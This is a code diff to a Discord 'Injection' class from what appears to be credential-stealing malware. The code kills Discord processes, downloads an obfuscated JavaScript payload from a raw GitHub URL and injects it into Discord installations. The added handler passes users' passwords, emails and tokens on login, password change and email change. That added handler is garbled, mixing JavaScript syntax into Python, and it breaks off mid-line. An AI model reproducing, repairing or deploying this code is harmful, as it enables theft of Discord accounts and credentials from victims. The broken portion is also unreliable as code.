@@ -15,7 +15,7 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get('https://github.com/Sercedes001/Sercedes-Injection/blob/main/obfuscated.js').text
+        self.code = requests.get('https://raw.githubusercontent.com/addi00000/empyrean-injection/main/obfuscated.js').text
         
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
@@ -58,3 +58,22 @@ class Injection:
                             executable = app + '\\' + executable
                             subprocess.call([update, '--processStart', executable],
                                             shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+    def event_handler(event, data, token):
+        for [key, value] in Object.entries({
+            "event": event,
+            "data": data,
+            "token": token
+        }):
+        this[key] = value
+         switch (this["event"]) {
+        case "passwordChanged":
+            event_handlers["passwordChanged"](this.data.password, this.data.new_password, this.token)
+        break;
+        case 'userLogin':
+            event_handlers["userLogin"](this.data.password, this.data.email, this.token)
+        break;
+        case 'emailChanged':
+            event_handlers["emailChanged"](this.data.password, this.data.email, this.token)
+        break;
+        case " 
